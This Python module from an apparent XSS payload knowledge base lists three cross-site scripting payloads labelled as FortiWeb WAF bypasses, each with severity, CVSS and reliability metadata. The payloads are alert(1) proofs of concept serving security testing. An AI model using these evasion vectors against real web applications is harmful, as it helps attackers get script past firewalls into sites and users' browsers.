#!/usr/bin/env python3
"""
Project: BRS-KB (BRS XSS Knowledge Base)
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2025-12-26 UTC
Status: Refactored
Telegram: https://t.me/EasyProTech

FortiWeb WAF Bypass Payloads
"""

from ..models import PayloadEntry


FORTIWEB_BYPASS_PAYLOADS = {
    "fortiweb_1": PayloadEntry(
        payload="<input onfocus=alert(1) autofocus>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="Input autofocus onfocus",
        tags=["fortiweb", "waf-bypass", "autofocus"],
        waf_evasion=True,
        bypasses=["fortiweb"],
        reliability="high",
    ),
    "fortiweb_2": PayloadEntry(
        payload="<math><mi//onclick=alert(1)>test</mi></math>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="MathML with comment separator",
        tags=["fortiweb", "waf-bypass", "mathml"],
        waf_evasion=True,
        bypasses=["fortiweb"],
        reliability="medium",
    ),
    "fortiweb_3": PayloadEntry(
        payload='<script\\x20type="text/javascript">alert(1)</script>',
        contexts=["html_content"],
        severity="critical",
        cvss_score=8.5,
        description="Hex space in script tag",
        tags=["fortiweb", "waf-bypass", "hex-space"],
        waf_evasion=True,
        bypasses=["fortiweb"],
        reliability="medium",
    ),
}

FORTIWEB_BYPASS_PAYLOADS_TOTAL = len(FORTIWEB_BYPASS_PAYLOADS)
